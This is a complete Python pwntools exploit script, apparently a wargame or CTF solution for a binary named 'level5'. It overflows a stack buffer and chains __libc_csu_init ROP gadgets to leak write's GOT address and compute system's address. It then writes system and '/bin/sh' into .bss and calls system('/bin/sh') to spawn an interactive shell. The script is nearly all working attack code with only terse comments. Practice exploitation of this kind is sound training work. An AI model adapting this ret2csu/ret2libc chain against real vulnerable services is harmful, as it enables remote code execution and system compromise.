#!/usr/bin/env python3
from pwn import *
import time

elf = ELF('level5')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  

p = process('./level5')
# p = remote('127.0.0.1', 10001)

got_write = elf.got['write']
print(f"got_write: {hex(got_write)}")
got_read = elf.got['read']
print(f"got_read: {hex(got_read)}")

main = 0x400564

off_system_addr = libc.symbols['write'] - libc.symbols['system']
print(f"off_system_addr: {hex(off_system_addr)}")

# rdi=  edi = r13,  rsi = r14, rdx = r15 
# write(rdi=1, rsi=write.got, rdx=4)
payload1 = b"\x00" * 136
payload1 += p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8)  # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload1 += p64(0x4005F0)  # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload1 += b"\x00" * 56
payload1 += p64(main)

p.recvuntil(b"Hello, World\n")

print("\n#############sending payload1#############\n")
p.send(payload1)
time.sleep(1)

write_addr = u64(p.recv(8))
print(f"write_addr: {hex(write_addr)}")

system_addr = write_addr - off_system_addr
print(f"system_addr: {hex(system_addr)}")

bss_addr = 0x601028

p.recvuntil(b"Hello, World\n")

# rdi=  edi = r13,  rsi = r14, rdx = r15 
# read(rdi=0, rsi=bss_addr, rdx=16)
payload2 = b"\x00" * 136
payload2 += p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16)  # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload2 += p64(0x4005F0)  # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload2 += b"\x00" * 56
payload2 += p64(main)

print("\n#############sending payload2#############\n")
p.send(payload2)
time.sleep(1)

p.send(p64(system_addr))
p.send(b"/bin/sh\0")
time.sleep(1)

p.recvuntil(b"Hello, World\n")

# rdi=  edi = r13,  rsi = r14, rdx = r15 
# system(rdi = bss_addr+8 = "/bin/sh")
payload3 = b"\x00" * 136
payload3 += p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr + 8) + p64(0) + p64(0)  # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload3 += p64(0x4005F0)  # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload3 += b"\x00" * 56
payload3 += p64(main)

print("\n#############sending payload3#############\n")
time.sleep(1)
p.send(payload3)

p.interactive()